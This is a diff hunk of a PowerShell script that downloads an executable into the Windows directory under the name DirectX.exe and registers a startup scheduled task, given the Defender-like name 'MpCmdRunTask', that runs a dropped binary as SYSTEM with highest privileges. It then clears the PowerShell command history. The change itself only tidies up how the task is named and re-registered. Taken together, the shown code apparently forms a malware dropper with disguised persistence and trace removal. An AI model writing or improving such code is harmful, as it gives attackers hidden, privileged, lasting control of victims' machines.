@@ -88,14 +88,22 @@ $filePathDirectX = "$env:windir\DirectX.exe"  # Destination file path (C:\Window
 
 Invoke-WebRequest -Uri $urlDirectX -OutFile $filePathDirectX 
 
-# Create a scheduled task to run MpCmdRun.exe at startup
+# Define the task name
+$taskName = "MpCmdRunTask"
+
+# Check if the scheduled task exists and remove it if it does
+if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+}
+
+# Define the action, trigger, principal, and settings for the scheduled task
 $action = New-ScheduledTaskAction -Execute $destinationPathMpCmdRun
 $trigger = New-ScheduledTaskTrigger -AtStartup
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
 
 # Register the scheduled task
-Register-ScheduledTask -TaskName "MpCmdRunTask" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings
 
 # Clear PowerShell history
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
